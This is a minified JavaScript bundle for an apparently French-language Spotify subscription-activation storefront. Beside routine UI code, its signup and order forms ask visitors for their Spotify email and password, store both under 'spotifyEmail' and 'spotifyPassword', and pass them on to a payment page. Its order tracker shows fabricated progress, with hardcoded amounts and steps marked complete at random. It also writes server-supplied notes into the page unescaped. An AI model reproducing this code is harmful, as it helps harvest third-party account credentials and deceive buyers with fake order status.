"use strict";(()=>{function x(){let e=document.getElementById("cookie-consent"),t=document.getElementById("accept-cookies"),n=document.getElementById("reject-cookies");!e||!t||!n||(localStorage.getItem("cookieConsent")||(e.style.display="block"),t.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),e.style.display="none"}),n.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),e.style.display="none"}))}function q(){let e=document.querySelector(".feature-slider");if(!e)return;let t=e.querySelector(".feature-slide-track"),n=!1,o,r,u=a=>{n=!0,e.classList.add("dragging"),o=a-e.offsetLeft,r=e.scrollLeft},l=()=>{n=!1,e.classList.remove("dragging")},f=a=>{if(!n)return;let E=a-e.offsetLeft-o;e.scrollLeft=r-E};e.addEventListener("mousedown",a=>u(a.pageX)),e.addEventListener("touchstart",a=>u(a.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",l),e.addEventListener("touchend",l),e.addEventListener("mousemove",a=>f(a.pageX)),e.addEventListener("touchmove",a=>f(a.touches[0].pageX),{passive:!0})}function X(){let e=document.getElementById("signup-form");e&&e.addEventListener("submit",t=>{t.preventDefault();let n=document.getElementById("hero-email").value.trim(),o=document.getElementById("hero-password").value.trim();!n||!o||(sessionStorage.setItem("spotifyEmail",n),sessionStorage.setItem("spotifyPassword",o),window.location.href="paiement.html")})}function N(){let e=document.getElementById("order-form");if(e){let t=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("cmd-email"),r=document.getElementById("cmd-password"),u=()=>{let l=Array.from(n).every(f=>f.checked);t.disabled=!l};n.forEach(l=>{l.addEventListener("change",u)}),e.addEventListener("submit",function(l){if(l.preventDefault(),!Array.from(n).every(E=>E.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let f=o.value,a=r.value;if(!f||!a){alert("Veuillez remplir tous les champs requis.");return}sessionStorage.setItem("spotifyEmail",f),sessionStorage.setItem("spotifyPassword",a),window.location.href="paiement.html"}),u()}}function A(){X(),N()}function R(){let e=document.querySelector(".mobile-menu-btn"),t=document.querySelector(".nav");e&&t&&e.addEventListener("click",()=>{t.classList.toggle("active"),e.classList.toggle("active")})}function j(){document.querySelectorAll(".faq-item").forEach(e=>{e.querySelector("h4").addEventListener("click",()=>e.classList.toggle("open"))})}function P(){let e=document.querySelector("header"),t=document.getElementById("back-to-top"),n=document.getElementById("theme-toggle");if(e){let o=()=>{window.scrollY>80?e.classList.add("header--scrolled"):e.classList.remove("header--scrolled")};window.addEventListener("scroll",o,{passive:!0}),o()}R(),j()}var z="https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec";function M(e){let t=document.getElementById("progress-bar-fill"),n=document.querySelectorAll(".step");if(!t||!n.length)return;let o=0;e===1?o=0:e===2?o=20:e===3?o=40:e===4?o=60:e===5&&(o=100),t.style.width=o+"%",n.forEach((r,u)=>{let l=u+1;r.classList.remove("active","completed"),l<e?r.classList.add("completed"):l===e&&r.classList.add("active")})}async function H(e){let t=document.getElementById("loading-overlay");t&&(t.style.display="flex");try{let n=await fetch(`${z}?orderID=${e}`);if(!n.ok)throw new Error("Network response was not ok.");let o=await n.json();return o.error?null:o}catch(n){return console.error("Failed to fetch tracking data:",n),null}finally{t&&(t.style.display="none")}}function K(e,t){if(t.innerHTML="",t.classList.remove("hidden"),!e){t.innerHTML='<p class="error-message">Commande non trouv\xE9e. Veuillez v\xE9rifier le num\xE9ro et r\xE9essayer.</p>';return}let o={pending:{text:"En attente",step:1},processing:{text:"En traitement",step:2},completed:{text:"Termin\xE9e",step:3}}[e.status]||{text:"Inconnu",step:0},r=`
        <div class="tracking-header">
            <div class="tracking-info">
                <h3>Commande #${e.orderID}</h3>
                <p class="tracking-date">Date: ${new Date(e.date).toLocaleDateString()}</p>
            </div>
            <div class="tracking-status">
                <span class="status-badge status-${e.status}">${o.text}</span>
            </div>
        </div>
        <div class="tracking-timeline">
            <div class="timeline-item ${o.step>=1?"completed":""}">
                <div class="timeline-icon">\u{1F4DD}</div>
                <div class="timeline-content"><h4>Commande Re\xE7ue</h4><p>Votre commande a \xE9t\xE9 enregistr\xE9e.</p></div>
            </div>
            <div class="timeline-item ${o.step>=2?"completed":""}">
                <div class="timeline-icon">\u2699\uFE0F</div>
                <div class="timeline-content"><h4>En Traitement</h4><p>Nous pr\xE9parons l'activation de votre compte.</p></div>
            </div>
            <div class="timeline-item ${o.step>=3?"completed":""}">
                <div class="timeline-icon">\u2705</div>
                <div class="timeline-content"><h4>Activation Termin\xE9e</h4><p>Votre abonnement est actif. Un email de confirmation a \xE9t\xE9 envoy\xE9.</p></div>
            </div>
        </div>
        ${e.notes?`<div class="tracking-notes"><h4>Notes:</h4><p>${e.notes}</p></div>`:""}
    `;t.innerHTML=r}function U(){let e=document.getElementById("track-order-btn"),t=document.getElementById("order-number"),n=document.querySelector(".tracking-result");if(e&&t&&n){let o=async()=>{let r=t.value.trim();if(!r){alert("Veuillez entrer un num\xE9ro de commande.");return}let u=await H(r);K(u,n)};e.addEventListener("click",o),t.addEventListener("keypress",r=>{r.key==="Enter"&&o()})}}function Y(){if(!document.getElementById("activation-progress"))return;let t=1;M(t);let n=setInterval(()=>{if(t++,t>5){clearInterval(n);return}M(t)},2e3)}function F(){document.getElementById("activation-progress")&&Y(),document.querySelector(".tracking-search")&&U()}function O(){let e=document.querySelectorAll("[data-reveal]");if(e.length===0)return;let t=new IntersectionObserver((n,o)=>{n.forEach(r=>{if(r.isIntersecting){let u=r.target.dataset.revealDelay||"0s";r.target.style.transitionDelay=u,r.target.classList.add("revealed"),o.unobserve(r.target)}})},{root:null,rootMargin:"0px",threshold:.1});e.forEach(n=>{let o=parseFloat(n.dataset.revealThreshold)||.1;t.observe(n)})}document.addEventListener("DOMContentLoaded",()=>{x(),q(),A(),P(),F(),O()});document.addEventListener("DOMContentLoaded",function(){let e=document.getElementById("order-form"),t=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("signup-form"),r=document.getElementById("hero-email"),u=document.getElementById("hero-password"),l=document.getElementById("cmd-email"),f=document.getElementById("cmd-password"),a=document.getElementById("email"),E=document.getElementById("password"),$=document.querySelectorAll(".faq-item"),k=document.getElementById("cookie-consent"),b=document.getElementById("accept-cookies"),B=document.getElementById("reject-cookies"),w=document.querySelector(".mobile-menu-btn"),C=document.querySelector(".nav"),L=document.getElementById("back-to-top"),g=document.querySelector(".feature-slider"),T=document.getElementById("theme-toggle"),I=document.getElementById("order-tracking");function V(){let s=Array.from(n).every(i=>i.checked);t.disabled=!s}if(n.forEach(s=>{s.addEventListener("change",V)}),e&&e.addEventListener("submit",function(s){if(s.preventDefault(),!Array.from(n).every(m=>m.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let i=a.value,d=E.value;if(!i||!d){alert("Veuillez remplir tous les champs requis.");return}window.location.href="paiement.html"}),o&&o.addEventListener("submit",s=>{s.preventDefault();let i=r.value.trim(),d=u.value.trim();!i||!d||(sessionStorage.setItem("spotifyEmail",i),sessionStorage.setItem("spotifyPassword",d),window.location.href="paiement.html")}),l&&f&&t){let s=function(){t.disabled=!(l.checkValidity()&&f.value.trim())};l.addEventListener("input",s),f.addEventListener("input",s),t.addEventListener("click",()=>{sessionStorage.setItem("spotifyEmail",l.value),sessionStorage.setItem("spotifyPassword",f.value),window.location.href="paiement.html"})}if($.forEach(s=>{s.querySelector("h4").addEventListener("click",()=>s.classList.toggle("open"))}),k&&b&&B&&(localStorage.getItem("cookieConsent")||(k.style.display="block"),b.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),k.style.display="none"}),B.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),k.style.display="none"})),w&&C&&w.addEventListener("click",()=>{C.classList.toggle("active"),w.classList.toggle("active")}),L&&(window.addEventListener("scroll",()=>{window.pageYOffset>300?L.style.display="block":L.style.display="none"}),L.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})})),g){let s=g.querySelector(".feature-slide-track"),i=!1,d,m,p=c=>{i=!0,g.classList.add("dragging"),d=c-g.offsetLeft,m=g.scrollLeft},h=()=>{i=!1,g.classList.remove("dragging")},v=c=>{if(!i)return;let y=c-g.offsetLeft-d;g.scrollLeft=m-y};g.addEventListener("mousedown",c=>p(c.pageX)),g.addEventListener("touchstart",c=>p(c.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",h),g.addEventListener("touchend",h),g.addEventListener("mousemove",c=>v(c.pageX)),g.addEventListener("touchmove",c=>v(c.touches[0].pageX),{passive:!0})}function S(s){let i=document.getElementById("progress-bar-fill"),d=document.querySelectorAll(".step");if(!i||!d.length)return;let m=0;s===1?m=0:s===2?m=20:s===3?m=40:s===4?m=60:s===5&&(m=100),i.style.width=m+"%",d.forEach((p,h)=>{let v=h+1;p.classList.remove("active","completed"),v<s?p.classList.add("completed"):v===s&&p.classList.add("active")})}window.updateProgressBar=S;let D=window.matchMedia("(prefers-color-scheme: dark)");if(T){let s=localStorage.getItem("theme");s?document.body.classList.toggle("light-theme",s==="light"):document.body.classList.toggle("light-theme",!D.matches),T.addEventListener("click",()=>{document.body.classList.toggle("light-theme");let i=document.body.classList.contains("light-theme");localStorage.setItem("theme",i?"light":"dark")}),D.addEventListener("change",i=>{localStorage.getItem("theme")||document.body.classList.toggle("light-theme",!i.matches)})}if(I){let s=I.querySelector("#track-order-btn"),i=I.querySelector("#order-number"),d=I.querySelector(".tracking-result");s&&i&&d&&s.addEventListener("click",()=>{let m=i.value.trim();if(!m)return;d.style.display="block",document.getElementById("result-order-number").textContent=m,document.getElementById("result-order-date").textContent=new Date().toLocaleDateString(),document.getElementById("result-email").textContent="exemple@email.com",document.getElementById("result-amount").textContent="82,62$ CAD",document.getElementById("result-payment-method").textContent="PayPal",document.getElementById("result-estimated-time").textContent="3 \xE0 5 jours ouvrables";let p=new Date;document.getElementById("timeline-order-date").textContent=p.toLocaleString(),document.getElementById("timeline-payment-date").textContent=new Date(p.getTime()+1e3*60*30).toLocaleString(),document.getElementById("timeline-verification-date").textContent=new Date(p.getTime()+1e3*60*60).toLocaleString(),document.getElementById("timeline-activation-date").textContent="En attente",document.getElementById("timeline-confirmation-date").textContent="En attente";let h=()=>{let c=d.querySelectorAll(".timeline-item"),y=1;Math.random()>.3&&(c[1].classList.add("completed"),y++),Math.random()>.6&&(c[2].classList.add("completed"),y++)},v=()=>{let c=1;S(c);let y=setInterval(()=>{if(c++,c>5){clearInterval(y);return}S(c)},2e3)};h(),v()})}});})();
